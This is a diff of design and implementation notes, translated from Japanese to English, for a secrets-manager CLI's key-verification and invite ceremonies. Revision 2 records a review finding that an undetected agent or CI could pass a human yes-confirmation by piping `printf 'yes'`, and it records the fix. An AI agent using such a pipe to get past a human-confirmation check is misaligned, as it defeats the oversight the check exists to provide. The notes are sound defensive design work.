+*Key Transparency log (KT)*: the WhatsApp / Keybase mechanism — "place all users' public keys on an append-only, auditable public log; clients verify consistency". What it protects is the "server swaps the public key at invite time" attack, which maruhi defends with the 12-word fingerprint ceremony. **Conclusion for maruhi: a standalone KT is unnecessary**. The reason: the project chain is already "the key ledger" — `add_member` records keys with the inviter's signature, and the invitee's CLI can compare its key on the chain against the actual key (a swap is detected on first sync). What KT protects beyond the chain is the "server shows a different chain only to the invitee" split view, and that is covered by head gossip, checkpoints, anchors, and the future **public witnessing of chain heads**. In other words, **in maruhi, KT ≈ public witness + self-audit**. However, detection-type (after-the-fact) is weaker than prevention-type (ceremony), and until detection the attacker can read values. **The invite ceremony stays in place**; the public witness remains a future item. As the cheap half, a **self-audit endpoint** (fetch "the public key the server is showing others for me" and compare locally; 1–2 days) is worth adding later.
 
-**ゼロベースの再探索(2026-09-05 — 追加 2 件)**:
+**Zero-base re-exploration (2026-09-05 — 2 additional items)**:
 
-| 案 | 内容 | 評価 |
+| Option | Content | Evaluation |
 |---|---|---|
-| **保護者の n-of-n(XOR 分割)** | 保護者つきリカバリーの 1-of-n は「保護者 1 人が暴走すれば(本人の GitHub セッションと共謀して)復元できる」。封印の KEK を乱数で XOR 分割して n 人に 1 片ずつ HPKE で包めば、**全員が揃わないと復元できない**(情報理論的に安全な標準構成。Shamir のような新プリミティブは不要で、乱数と XOR だけ。Phase も PAT の分割に同じ構成を使う)。1-of-n と n-of-n を利用者が選べる | **◎ KL3 の設計に含める**(仕様に分割の規定を書く必要はある) |
-| **ビルドハッシュの申告** | ヘッド申告(§6.6)に CLI の自ビルドハッシュを添えれば、チームは「全員が同じ検証済みビルドを走らせている」を確かめられ、1 人だけ改竄されたバイナリを使っている状況を検出できる。再現可能ビルドの社会的な層 | ○ 安い(申告のフィールド追加)。再現性が成立した後に |
+| **Guardian n-of-n (XOR splitting)** | Guardian-attached recovery's 1-of-n means "one rogue guardian (colluding with the owner's GitHub session) can restore". If the seal KEK is XOR-split with randomness and one share is HPKE-wrapped to each of n guardians, **restore requires everyone** (an information-theoretically secure standard construction — no new primitive like Shamir needed; just randomness and XOR. Phase uses the same construction for splitting PATs). The user chooses between 1-of-n and n-of-n | **◎ include in KL3's design** (the spec does need to specify the splitting) |
+| **Build-hash declaration** | If the head declaration (§6.6) carries the CLI's own build hash, a team can confirm "everyone is running the same verified build" and detect when one person alone is using a tampered binary. The social layer of reproducible builds | ○ cheap (adding a field to the declaration). After reproducibility is established |
 
-打ち止め: OpenTimestamps 等の外部タイムスタンプは公開証人の変種、CI 実行を証人にする案はヘッド申告として既存、それ以外は既出かガードレールに反する。
-**訂正: 鍵の透明性ログと 12 語の儀式の関係(2026-09-05)**。前段で「KT があれば儀式を省略可まで軽くできる」と書いたのは言い過ぎだった。正確には:
-- 招待時にサーバーが公開鍵をすり替えた場合、**被招待者の CLI は初回同期で機械的に検出する**(§6.5 受諾者側の機械照合 + チェーン上の自分の鍵と実鍵の照合。サーバーは招待者の署名を偽造できないため、被招待者に「正しい鍵の入ったチェーン」を見せることもできない)。**これは KT なしで既に成立している**
-- 儀式(招待者側の 12 語照合)が守るのは、その検出までの**窓**: 招待者が `add_member` した瞬間から被招待者の初回同期までの間、すり替えた鍵へ包まれた DEK がサーバーの手に渡り、現在値が読める。検出後はローテーションで回復するが、その間に読まれた値は取り消せない
-- KT はこの窓を短くしない。KT が足すのは「サーバーがやったことを第三者にも証明できる」公開の説明責任(抑止)だけで、それは公開証人で得られる
-- したがって「儀式を省略する」= 「窓の間にサーバーに現在値を読まれる可能性を受け入れ、検出とローテーションで対処する」という**方針の選択**であり、暗号機構の追加で消える話ではない。既定は儀式を必須のまま(CRYPTO_SPEC §6.5)。将来、プロジェクト単位の方針(低リスク環境では儀式を省略可 = TOFU)を置くかは所有者裁定
+Enumeration closed: external timestamps like OpenTimestamps are a public-witness variant; making CI a witness already exists as head declarations; everything else was already covered or violates a guardrail.
+**Correction: the relationship between the key-transparency log and the 12-word ceremony (2026-09-05)**. Writing earlier that "with KT, the ceremony could be lightened to optional" was an overstatement. Precisely:
+- If the server swaps the public key at invite time, **the invitee's CLI detects it mechanically on first sync** (§6.5's accepter-side machine comparison + comparing the invitee's own key on the chain with the actual key. Since the server can't forge the inviter's signature, it also can't show the invitee "a chain containing the correct key"). **This already holds without KT**
+- What the ceremony (the inviter-side 12-word comparison) protects is the **window** until that detection: between the moment the inviter runs `add_member` and the invitee's first sync, a DEK wrapped to the swapped key reaches the server's hands and current values are readable. Rotation recovers it after detection, but values read in the meantime can't be un-read
+- KT does not shorten this window. What KT adds is public accountability (deterrence) — "what the server did can be proven to third parties" — which the public witness provides
+- So "omit the ceremony" = **a policy choice** of "accept that the server may read current values during the window, and handle it with detection and rotation" — not something a crypto mechanism eliminates. The default keeps the ceremony mandatory (CRYPTO_SPEC §6.5). Whether to add a per-project policy (ceremony optional in low-risk environments = TOFU) is an owner ruling
 
-**分散型の探索ループ(2026-09-05 — 打ち止めまで)**:
+**The decentralized-exploration loop (2026-09-05 — until enumeration closed)**:
 
-第 A 巡:
+Round A:
 
-| 案 | 内容 | 評価 |
+| Option | Content | Evaluation |
 |---|---|---|
-| **検証済み指紋帳(known_hosts 型)** | maruhi の鍵は**ユーザー単位**(1 人 1 master 鍵)なので、一度 12 語で確認した相手の指紋は永久に有効。CLI が「自分が確認した相手の指紋」を非機密設定として手元に持てば(SSH の known_hosts と同じ発想)、**同じ相手を別プロジェクトへ招くときは儀式が自動で通る**。ADR-0014 決定 5 の「初回と招待だけ」が「相手ごとに初回だけ」に縮む。暗号変更なし・永続化は公開鍵なので規律の範囲内 | **◎ 安い(1〜2 日)。SY / KL と並走でベータ前に入れる価値がある** — 儀式の摩擦を最も安く減らす手 |
-| 組織の鍵台帳(org 内の鍵を org owner が署名) | 組織内の招待は儀式不要にする mini-PKI | ○ 後回し。指紋帳で 8 割取れる。Enterprise 枠の候補 |
-| **可搬な監査証跡(`audit export`)** | チェーン + チェックポイント + ヘッド申告を自己検証可能な束として出力し、監査人が maruhi サーバーなしで `audit verify` 相当の検証をできるようにする | ○ 安い(検証コードは CLI に既にある)。企業向け・後回し |
-| 署名付き委任(macaroon 型) | メンバーが自分の鍵で「環境 X を 1 時間だけ読める」能力を署名して発行し、サーバーはチェーンの鍵で検証する。サーバー発行の bearer トークン(AUTH_SPEC §6)の代替 | △ 面白いがリース(§9.1)と役割が重なる。AUTH_SPEC の再設計になるので後回し |
+| **Verified fingerprint book (known_hosts type)** | maruhi keys are **per-user** (one master key per person), so a fingerprint verified once via the 12 words stays valid forever. If the CLI locally holds "fingerprints of parties I verified" as non-secret config (same idea as SSH's known_hosts), **inviting the same person to a different project passes the ceremony automatically**. ADR-0014 decision 5's "first time and invites only" shrinks to "first time per person". No crypto change; persistence is public keys, within the discipline | **◎ cheap (1–2 days). Worth getting in before beta alongside SY / KL** — the cheapest way to cut ceremony friction |
+| Organization key ledger (org owner signs keys inside the org) | A mini-PKI making invites inside the org ceremony-free | ○ deferred. The fingerprint book gets 80%. An Enterprise-slot candidate |
+| **Portable audit evidence (`audit export`)** | Output the chain + checkpoints + head declarations as a self-verifiable bundle so an auditor can run `audit verify`-equivalent verification without the maruhi server | ○ cheap (the verification code is already in the CLI). Enterprise-facing; deferred |
+| Signed delegation (macaroon type) | A member signs a capability "environment X readable for 1 hour" with their own key and issues it; the server verifies against the chain's keys. An alternative to server-issued bearer tokens (AUTH_SPEC §6) | △ interesting but overlaps the role of leases (§9.1). It's an AUTH_SPEC redesign, so deferred |
 
-第 B 巡: プロジェクト間の参照(別チェーンのメンバー集合へ読み取り許可)は複雑で見送り。デバイス鍵分離(未決 #2)は分散型というより既定路線。CI を証人にする案・外部タイムスタンプは既出。
+Round B: cross-project references (grant read permission to another chain's member set) — complex, deferred. Device-key separation (open item #2) is the default path rather than a decentralized idea. Making CI a witness and external timestamps were already covered.
 
-第 C 巡: 新規なし。**打ち止め**。今回のループで採用に値するのは検証済み指紋帳 1 件、後回しが 3 件。
+Round C: nothing new. **Enumeration closed**. In this loop, 1 item is worth adopting (the verified fingerprint book) and 3 are deferred.
 
-**KF 実装録(2026-09-11 — PR #164)**: 検証済み指紋帳を CLI に実装した(`apps/cli/src/known-fingerprints.ts` + member add / invite accept の両儀式への組み込み)。裁定:
+**KF implementation log (2026-09-11 — PR #164)**: implemented the verified fingerprint book in the CLI (`apps/cli/src/known-fingerprints.ts` + wiring into both member add and invite accept ceremonies). Rulings:
 
-- **置き場所**: `<config dir>/known-fingerprints.json` 単一ファイル(`{ v: 1, known: { [origin]: { [user_id]: { fingerprintHex, verifiedAtMs } } } }`)。鍵はユーザー単位・プロジェクト横断が目的なので pins(プロジェクト単位の `invites/<projectId>.json`)とは別置き。origin でスコープし、別サーバーの同一 user_id を別人として扱う。config.json 内は `config set` の許可キー空間を汚し破損の爆風半径が大きいため不採用
-- **参照箇所**: 両側の儀式(member add の受諾鍵確認・invite accept の招待者確認)。相互確認は対称で、どちら側でも「一度確認した相手」は同じ
-- **ヒット(一致)**: hex + 12 語の表示は従来どおり出し、~~最終語の再入力だけを省略する。`--expect-fingerprint` / `--inviter-fingerprint` と等価の機械照合なので、エージェント環境でも通す~~(改訂 1 で訂正 — 下記)(フラグの明示指定は帳より優先)
-- **不一致**: 自動で通さない・自動失敗にもしない(`maruhi key generate` による正当な鍵更新があり得る — SSH の strict known_hosts と違い、鍵の変更を儀式の再実行で解決できる)。警告して通常の儀式へ戻し、成功で上書きする。エージェント環境 + 不一致 + フラグなしは従来どおり拒否
-- **記録**: 対話儀式とフラグ照合の成功後(フラグは「帯域外で控えた」の表明なので記録に値する)。ヒットでは verifiedAtMs を更新しない(記録は人間が検証した時点の事実)。書き込み失敗は警告のみ(pins と同じ SHOULD 水準の fail-open — 帳が消えても儀式へ戻るだけで fail-closed)
-- **accept 側の記録の妥当性**: リンクの `iu=` は受諾時点ではチェーン未照合だが、細工リンク(iu=攻撃者, if=正規 FP)で汚れた記録は攻撃者の実鍵と一致しないため auto-pass に化ける経路がなく(不一致 → 儀式)、user_id ↔ FP の機械照合は初回同期のアンカー検査(context.ts)が行う
-- **管理コマンドは追加しない**: 可読 JSON + 記録時のメッセージにパスを表示。エントリ削除で儀式が復活。一覧・削除コマンドは需要が見えてから
-- **破損ファイル**: corrupt として miss と区別(警告)し、上書きを拒否(pins の merge と同じ規律 — 意図しない変更の痕跡を黙って消さない)。レコードキーは先頭英数字を要求し `__proto__` を構造的に排除、参照は floorRecordGet(floor.ts の規律)
+- **Location**: a single file `<config dir>/known-fingerprints.json` (`{ v: 1, known: { [origin]: { [user_id]: { fingerprintHex, verifiedAtMs } } } }`). Keys are per-user and the goal is cross-project, so it's stored apart from pins (the per-project `invites/<projectId>.json`). Scoped by origin, treating the same user_id on a different server as a different person. Inside config.json is rejected — it pollutes `config set`'s allowed key space and the blast radius of corruption is large
+- **Reference sites**: the ceremonies on both sides (member add's accepter-key check, invite accept's inviter check). Mutual verification is symmetric — "someone I've verified once" is the same on either side
+- **Hit (match)**: hex + 12 words are still displayed as before, ~~only the final-word re-entry is omitted. Equivalent to the machine comparison of `--expect-fingerprint` / `--inviter-fingerprint`, so it also passes in agent environments~~(corrected in revision 1 — below)(an explicit flag takes priority over the book)
+- **Mismatch**: does not auto-pass and does not auto-fail (a legitimate key update via `maruhi key generate` is possible — unlike SSH's strict known_hosts, a key change can be resolved by re-running the ceremony). Warn and return to the normal ceremony; on success, overwrite. Agent environment + mismatch + no flag is refused as before
+- **Recording**: after a successful interactive ceremony or flag comparison (a flag is a declaration of "written down out-of-band", so it earns a record). A hit does not update verifiedAtMs (the record is the fact of when a human verified). Write failure is a warning only (the same SHOULD-level fail-open as pins — if the book is lost, the worst case is returning to the ceremony = fail-closed)
+- **Validity of the accept-side record**: the link's `iu=` is not yet chain-verified at acceptance time, but a record polluted by a crafted link (iu=attacker, if=legit FP) can't become an auto-pass path since it won't match the attacker's actual key (mismatch → ceremony), and the user_id ↔ FP machine comparison is done by the first-sync anchor check (context.ts)
+- **No management commands**: human-readable JSON + show the path in the message when recording. Deleting an entry revives the ceremony. List / delete commands wait for visible demand
+- **Corrupt file**: distinguished from a miss as "corrupt" (warning) and overwriting is refused (same discipline as pins' merge — don't silently erase traces of unintended change). Record keys require a leading alphanumeric and structurally exclude `__proto__`; reads use floorRecordGet (floor.ts's discipline)
 
-**KF 実装録 改訂 1(2026-09-11 — PR #164 レビュー対応)**: レビュー(pullfrog)の 3 指摘を受け、ヒット時の挙動を狭めた。
+**KF implementation log, revision 1 (2026-09-11 — PR #164 review response)**: on 3 points from the review (pullfrog), narrowed the on-hit behavior.
 
-- **「フラグ経路と等価」の主張は誤りだったので撤回**: `--expect-fingerprint` / `--inviter-fingerprint` は**この受諾 1 件**について帯域外で控えた値の表明(受諾単位の明示アサーション)であり、帳は**過去の別文脈**(別プロジェクト・別時点)の検証の記録にすぎない。招待リンクは無記名(bearer)で受諾者の同一性を運ばないため、盗まれた・転送されたリンクを「過去に検証済みの同僚」が受諾した場合、帳の完全 auto-pass では付与(+ DEK バックフィル)が一切の人間確認なしに成立してしまう
-- **狭めた設計**: 帳のヒットで免除するのは **12 語の帯域外読み上げの再実施のみ**。付与 / 受諾そのものの明示確認は残す — 対象を名指しする yes 入力(`confirmKnownFingerprint`: member add は "Type yes to add <user> as <role> with this previously verified key"、invite accept は "Type yes to accept this invite attributed to <inviter> for project <project>")。これは既存フラグ経路の「帯域外の記録を照合済みとして扱う」と同型の解釈で、CRYPTO_SPEC §6.5 の「帯域外照合の明示確認を要求する」の範囲内に収まる(仕様改訂を要しない)
-- **エージェント環境は据え置き拒否**: 帳のヒットを儀式代行の根拠にしない。非対話経路はフラグの明示指定のみ(ADR-0016 決定 7 の deny-list ゲートと整合)
-- **表示の整合(同レビューの nitpick 対応)**: ヒット時は読み上げ照合の指示 2 行("Check that this word list matches …")を落とす(通話を指示した直後に「要らない」と言わない — hex + 12 語の表示自体は据え置き)。帳の記録と提示指紋の不一致警告はフラグ経路の判定後に遅延させる(フラグが実指紋と一致していて帳だけが古い場合に、警告とフラグ成功が矛盾して並ばないように)
-- **未決(所有者判断)**: ROADMAP の KF 完了条件の字面は「儀式を自動で通す」だが、完全 auto-pass は §6.5 の相互確認 UX の緩和 = 仕様改訂(仕様変更はまず仕様書 → 人間承認)を要する。現実装の「yes 1 語」でも摩擦削減の大半(12 語の電話照合の省略)は達成しているため、完全 auto-pass まで進めるかは §6.5 改訂の所有者判断に委ねる(補足 18 の I1 + I2 が入れば儀式自体が既定で不要になるため、そこで自然解消する可能性が高い)
+- **Retracted the incorrect "equivalent to the flag path" claim**: `--expect-fingerprint` / `--inviter-fingerprint` are declarations of a value written down out-of-band **for this one acceptance** (a per-acceptance explicit assertion), while the book is merely a record of **a past verification in a different context** (a different project, a different time). Since invite links are bearer — they carry no acceptee identity — if a stolen / forwarded link is accepted by "a colleague verified in the past", the book's full auto-pass would let the grant (+ DEK backfill) complete with zero human confirmation
+- **The narrowed design**: what a book hit exempts is **only re-performing the 12-word out-of-band readout**. The explicit confirmation of the grant / acceptance itself remains — a yes input naming the subject (`confirmKnownFingerprint`: member add shows "Type yes to add <user> as <role> with this previously verified key", invite accept shows "Type yes to accept this invite attributed to <inviter> for project <project>"). This is the same shape of interpretation as the existing flag path's "treat the out-of-band record as compared", and stays within CRYPTO_SPEC §6.5's "require explicit confirmation of the out-of-band comparison" (no spec revision needed)
+- **Agent environments stay refused**: a book hit is not grounds to act as the ceremony. The non-interactive path is the explicit flag only (consistent with ADR-0016 decision 7's deny-list gate)
+- **Display consistency (that review's nitpick)**: on a hit, drop the 2 lines instructing readout comparison ("Check that this word list matches …") — don't say "not needed" right after instructing a call (the hex + 12-word display itself stays). The mismatch warning between the book's record and the presented fingerprint is deferred until after flag-path evaluation (so a warning and a flag success don't stand contradictorily side by side when the flag matches the actual fingerprint and only the book is stale)
+- **Open (owner's decision)**: the ROADMAP's KF completion condition literally says "pass the ceremony automatically", but full auto-pass relaxes §6.5's mutual-confirmation UX = a spec revision (spec changes go spec-first → human approval). The current "one yes word" already achieves most of the friction reduction (omitting the 12-word phone comparison), so whether to go all the way to full auto-pass is left to the owner's decision as a §6.5 revision (likely to resolve naturally once supplement 18's I1 + I2 land, since the ceremony itself becomes unnecessary by default)
 
-**KF 裁定(2026-09-12 — 所有者委任)**: 改訂 1 の未決(§6.5 の「明示確認」の解釈が notes にしかない件)は「**規範化する**」で確定(所有者が判断を委任し、その範囲で裁定)。CRYPTO_SPEC §6.5 に「明示確認の充足形」を追記した: (1) 読み上げ儀式(既定)/ (2) フラグによる機械照合(非対話で許される唯一の形)/ (3) 帳のヒット + 受諾単位の yes 確認(読み上げの再実施のみ免除。対話端末限定・エージェント環境では使わない)。**完全 auto-pass は不採用**と明記し、儀式の既定廃止は IV1 / IV2 の仕様改訂としてのみ行う。これをもって KF は完了(ROADMAP のチェックを付けた)。
+**KF ruling (2026-09-12 — owner delegation)**: revision 1's open item (the fact that §6.5's "explicit confirmation" interpretation lives only in notes) was settled as "**codify it**" (the owner delegated the decision, ruled within that scope). Added "satisfaction forms of explicit confirmation" to CRYPTO_SPEC §6.5: (1) the readout ceremony (default) / (2) flag-based machine comparison (the only form allowed non-interactively) / (3) book hit + per-acceptance yes confirmation (exempts only re-performing the readout; interactive terminals only, not used in agent environments). Explicitly recorded **full auto-pass is not adopted**, and abolishing the ceremony by default happens only via the IV1 / IV2 spec revision. With this, KF is complete (checked off on the ROADMAP).
 
-**KF 実装録 改訂 2(2026-09-12 — マージ後の Security Reviewer 指摘対応)**: ヒット時の yes 確認に TTY 要件がなく、未検出エージェント・CI・パイプで `printf 'yes' |` により非対話成立する(12 語儀式は実行ごとの最終語再入力が要るため盲目的パイプでは通らなかった — 帳が非対話の成立条件をフラグ専用から緩めていた)という MEDIUM 指摘を受け、**帳を使えるのを stdin / stdout が両方対話端末のときだけ**に絞った(ADR-0016 決定 7 の一次境界と同じ allow-list)。非端末では帳を無効化して完全な儀式へフォールバックし(fail-closed — expect 型ハーネスなら従来どおり通る = KF 以前と同じ強度)、その旨を note で表示する。検出済みエージェントの拒否・フラグ優先は不変。
-### 補足 18: 初回の招待儀式を軽くする(2026-09-05 — 所有者依頼)
+**KF implementation log, revision 2 (2026-09-12 — post-merge Security Reviewer response)**: received a MEDIUM finding that the on-hit yes confirmation had no TTY requirement, so an undetected agent / CI / pipe could complete it non-interactively via `printf 'yes' |` (the 12-word ceremony couldn't be passed by blind piping because it requires re-entering the final word each run — the book had relaxed the non-interactive completion condition from flag-only) — **restricted book use to when both stdin / stdout are interactive terminals** (the same allow-list as ADR-0016 decision 7's primary boundary). Off-terminal, the book is disabled and falls back to the full ceremony (fail-closed — an expect-style harness still passes as before = same strength as pre-KF), with a note saying so. Refusal for detected agents and flag priority are unchanged.
+### Supplement 18: lightening the first invite ceremony (2026-09-05 — owner request)
 
-**儀式が守るもの(再掲)**: 招待者 Alice が受け取る「Bob の鍵」を maruhi サーバーがすり替える攻撃。現状は受諾者側の機械照合(§6.5)で事後検出され、招待者側の 12 語照合で事前に防ぐ。**サーバーがすり替えられる理由は、受諾ブロック(鍵 + 受諾署名)がサーバー経由で Alice に届き、Alice には「本当に Bob の鍵か」を機械で確かめる材料がないから**。材料を与えれば儀式は要らなくなる。
+**What the ceremony protects (recap)**: the attack where the maruhi server swaps "Bob's key" that inviter Alice receives. Currently it's detected after the fact by the accepter-side machine comparison (§6.5) and prevented beforehand by the inviter-side 12-word comparison. **The reason the server can swap is that the acceptance block (key + acceptance signature) reaches Alice via the server, and Alice has no material to mechanically check "is this really Bob's key"**. Give her the material and the ceremony becomes unnecessary.
 
-| 案 | 内容 | 何が変わるか | 評価 |
+| Option | Content | What changes | Evaluation |
 |---|---|---|---|
-| **I1. 招待リンクの秘密を 2 つに分け、受諾を「リンクを持つ者」に結び付ける** | 現状はリンクの生トークンを受諾時にサーバーへ送る(AUTH_SPEC §15-2)ため、サーバーは受諾時点で生トークンを知り、攻撃者鍵の受諾を自作できる。改訂: リンクの秘密 S から `redeem = HKDF(S, "redeem")` と `bind = HKDF(S, "bind")` を導出する。サーバーへ送るのは `redeem` だけ(サーバーはそのハッシュを保持)。受諾には `tag = HMAC(bind, invitee の enc 鍵 ‖ sig 鍵)` を添える。**`bind` はサーバーに一度も渡らない**ので、サーバーは攻撃者鍵に対する正しい tag を作れない。Alice のクライアントは S を知っているので `member add` 時に tag を機械検証する | **サーバーによる鍵すり替えが暗号的に不可能になる** → 12 語の照合はサーバー脅威に対して不要。残る脅威は「リンクそのものを盗んだ者が先に受諾する」(リンク経路の問題。現状も同じで、単回使用の衝突で顕在化する)。HKDF / HMAC-SHA256 は WebCrypto にある。CRYPTO_SPEC §6.5 + AUTH_SPEC §15 の改訂、テストベクター、crypto レビュー | **◎ 本命。概算 1〜2 週**。仕様の変更は小さく(受諾ブロックに tag が 1 つ増え、サーバーへ送るトークンが導出値になる)、儀式の必要性そのものを消す |
-| **I2. GitHub の署名鍵ディレクトリで身元を裏付ける** | maruhi の身元の根は既に GitHub(認証は GitHub のみ)。Bob が自分の maruhi 署名公開鍵を **GitHub の SSH 署名鍵**(コミット署名用。SSH 認証には使えない種別)として登録しておけば(`maruhi key publish` — `gh ssh-key add --type signing` で自動化可)、Alice の CLI は GitHub の公開 API(`GET /users/{login}/ssh_signing_keys` — 認証不要)で受諾鍵を照合できる。maruhi サーバーは経路に入らない | **リンク盗難の脅威にも効く**(盗んだ者の鍵は Bob の GitHub にない)。GitHub は既に認証の根なので新しい信頼先は増えない。CLI が github.com へ問い合わせる(公開情報の取得。テレメトリではないが「CLI の外部送信」の初例 — 所有者裁定)。副産物: 同じ鍵でコミット署名もできる(鍵の用途共有は LP ドメイン分離と SSHSIG 枠付けで実害なし。分ける設計も可) | **○ I1 の次**。GitHub ログイン(`gh`)が手元にある前提。概算 1 週 |
-| I3. SAS 短縮(ZRTP 型 commit-then-reveal で 12 語 → 4 語) | 儀式を残したまま短くする | 儀式が要る場面(高保証・リンク経路を信用しない)の負担を 1/3 に | △ I1 + I2 で儀式が既定で不要になれば優先度は下がる。将来の「高保証モード」用 |
-| I4. 指紋帳(KF) | 同じ相手の 2 回目以降 | 既に採用 | — |
+| **I1. Split the invite link's secret in two and bind acceptance to "the holder of the link"** | Today the link's raw token is sent to the server at acceptance (AUTH_SPEC §15-2), so the server learns the raw token at that point and can fabricate an acceptance with the attacker's key. Revision: from the link secret S, derive `redeem = HKDF(S, "redeem")` and `bind = HKDF(S, "bind")`. Only `redeem` is sent to the server (the server keeps its hash). Acceptance attaches `tag = HMAC(bind, invitee's enc key ‖ sig key)`. **`bind` never reaches the server**, so the server cannot produce a correct tag for the attacker's key. Alice's client knows S, so at `member add` it mechanically verifies the tag | **Key swapping by the server becomes cryptographically impossible** → the 12-word comparison becomes unnecessary against the server threat. What remains is "someone who stole the link itself accepts before Bob" (a link-path problem; same as today, surfacing as a single-use collision). HKDF / HMAC-SHA256 are in WebCrypto. CRYPTO_SPEC §6.5 + AUTH_SPEC §15 revision, test vectors, crypto review | **◎ the leading candidate. Estimate 1–2 weeks**. The spec change is small (one tag added to the acceptance block; the token sent to the server becomes a derived value), and it eliminates the need for the ceremony itself |
+| **I2. Back identity with GitHub's signing-key directory** | maruhi's root of identity is already GitHub (auth is GitHub only). If Bob registers his maruhi signing public key as a **GitHub SSH signing key** (the commit-signing kind; can't be used for SSH auth) in advance (`maruhi key publish` — automatable via `gh ssh-key add --type signing`), Alice's CLI can verify the acceptance key against GitHub's public API (`GET /users/{login}/ssh_signing_keys` — unauthenticated). The maruhi server is not in the path | **Also effective against link theft** (a thief's key is not on Bob's GitHub). GitHub is already the root of auth, so no new trust target is added. The CLI queries github.com (fetching public information; not telemetry, but the first instance of "the CLI sending outbound" — owner ruling). Byproduct: the same key can sign commits (sharing a key's purpose is harmless given the LP domain separation and SSHSIG framing; a design that separates them is also possible) | **○ after I1**. Assumes `gh` login at hand. Estimate 1 week |
+| I3. Shorten the SAS (ZRTP-style commit-then-reveal: 12 words → 4) | Keep the ceremony but shorten it | Cuts the burden to 1/3 in cases where the ceremony is needed (high assurance, distrusting the link path) | △ priority drops if I1 + I2 make the ceremony unnecessary by default. For a future "high-assurance mode" |
+| I4. Fingerprint book (KF) | Second time onward with the same person | Already adopted | — |
 
-**I1 + I2 を入れた後の招待フロー**:
-1. Alice: `maruhi invite create` → リンクを Bob に渡す(Slack DM 等)
-2. Bob: `maruhi invite accept <リンク>`(受諾に tag が自動で付く。Bob の作業はこれだけ)
-3. Alice: `maruhi member add` → CLI が tag を検証(I1)し、Bob の GitHub 署名鍵と照合(I2)して、**そのまま追加**。表示は "Acceptance is bound to the invite link you issued, and the key is listed on github.com/bob. Adding." 電話は要らない
-4. どちらかが失敗したときだけ 12 語の儀式に落ちる(fail-closed)
+**The invite flow after I1 + I2**:
+1. Alice: `maruhi invite create` → hands the link to Bob (Slack DM etc.)
+2. Bob: `maruhi invite accept <link>` (the acceptance automatically carries the tag. This is Bob's only work)
+3. Alice: `maruhi member add` → the CLI verifies the tag (I1) and compares against Bob's GitHub signing key (I2), and **adds as-is**. Display: "Acceptance is bound to the invite link you issued, and the key is listed on github.com/bob. Adding." No phone call needed
+4. Only when either fails does it fall back to the 12-word ceremony (fail-closed)
 
-**残余(正直に)**: リンクを渡した経路(Slack 等)が攻撃者に読まれ、かつ攻撃者が Bob より先に受諾し、かつ Bob の GitHub に鍵を置けない(I2)— この三重条件だけが残る。I2 なしなら「リンク盗難 + 先着」が残余で、単回使用の衝突で Bob 側に顕在化する(Bob の受諾が 410 になる)。脅威モデル文書に「招待リンクは信頼できる経路で渡す」を明記する。
+**Residual (honestly)**: the path over which the link was handed (Slack etc.) is read by an attacker, AND the attacker accepts before Bob, AND cannot place a key on Bob's GitHub (I2) — only this triple condition remains. Without I2 the residual is "link theft + first-come", which surfaces on Bob's side as a single-use collision (Bob's acceptance gets a 410). The threat-model document states "hand invite links over a trusted path".
 
-**時期**: 2026-09-05 所有者裁定で I1 + I2 を招待制ベータのゲートに置く(KL3 と同じ仕様改訂サイクル)。
+**Timing**: the 2026-09-05 owner ruling placed I1 + I2 on the invite-beta gate (same spec-revision cycle as KL3).
 
-**I1 と I2 の関係(所有者質問への回答)**: I1 が本体で、サーバーによるすり替えを暗号で消す。I1 だけでも儀式は「サーバー脅威に対して不要」になるが、リンク盗難(リンクを渡した経路が読まれ、盗んだ者が Bob より先に受諾する)は残る。この残余は Bob の受諾が単回使用の衝突(410)で失敗することで Bob 側に顕在化し、Alice がローテーションで回復できる(検出型)。I2 はこの残余を事前に閉じる(盗んだ者の鍵は Bob の GitHub にない)。つまり **儀式なしを「既定」にするには I2 が要り、I1 だけなら儀式なしは「リンク経路を信頼する設定」として提供する**形になる。両方入れるのが推奨。
+**The relationship between I1 and I2 (answer to the owner's question)**: I1 is the body — it cryptographically eliminates server-side swapping. With I1 alone the ceremony becomes "unnecessary against the server threat", but link theft (the path over which the link was handed is read, and the thief accepts before Bob) remains. That residual surfaces on Bob's side via a single-use collision (410) on his acceptance, and Alice can recover with rotation (detection-type). I2 closes this residual beforehand (a thief's key is not on Bob's GitHub). So **to make "no ceremony" the default, I2 is needed; with I1 alone, "no ceremony" is offered as a "trust the link path" configuration**. Adopting both is recommended.
 
-**SSO との整合**: I1 は IdP に依存しない(招待リンクと HMAC だけ)。I2 は GitHub 固有だが、「身元の裏付け元」を差し替え可能な抽象(`github-signing-keys` / `org-directory` / `none`)として設計する。SSO(Okta / Entra 等)は公開鍵の台帳を持たないため、SSO 導入時の同等物は**組織の鍵台帳**(org owner が各メンバーの鍵指紋を署名して台帳化 — 補足 17 第 A 巡)になる。チェーン・鍵・招待リンクの形は IdP と無関係(チェーンにプロバイダ ID を書かない規律)なので、後から SSO を入れても I1 / I2 を作り直す必要はない。
-
-
+**Consistency with SSO**: I1 is IdP-independent (just the invite link and HMAC). I2 is GitHub-specific, but is designed as a swappable abstraction for "the backing source of identity" (`github-signing-keys` / `org-directory` / `none`). Since SSO (Okta / Entra etc.) holds no public-key ledger, the SSO-era equivalent is **the organization key ledger** (the org owner signs each member's key fingerprint into a ledger — supplement 17, round A). The shapes of chains, keys, and invite links are IdP-independent (the discipline of not writing provider IDs into the chain), so introducing SSO later doesn't require rebuilding I1 / I2.
 
 
-- **チェーン上の複数署名承認(四眼のオンチェーン化)**: `grant_server` / `remove_member` 等の危険操作を owner 2 名の署名で受理する。チェーンが署名済みなので自然。将来項「四眼」の実装形として有力。仕様改訂
-- **チェーンヘッドの公開証人(public witness)**: 署名済みヘッド申告をユーザー所有の git リポジトリ等の公開追記ログへ置き、サーバーの split view(§14.3-4)を第三者が検出可能にする。既存のリポジトリアンカーの拡張。送信先はユーザー設定に限定(テレメトリゼロと整合)
-- **可用性の正直な穴**: デプロイ時再適用も CI リースもホステッドの稼働に依存する。maruhi が落ちるとデプロイが止まる。分散型の答えはミラーだけで、それが後回しである以上、脅威モデル文書に「可用性は保証しない(G8)」として明記し、ステータスページで補う
-- 一回限りの共有(`maruhi share` — メンバーでない相手の公開鍵へ HPKE で包む。Doppler Share の CLI 版)・他 maruhi サーバーとの連合・オフラインの暗号文レプリカ(永続化規律に反する)は今は採らない
 
-### 補足 19: KL3 設計録 — master 鍵ラップ台帳(2026-09-12 — フェーズ 1 設計セッション。同日所有者承認)
 
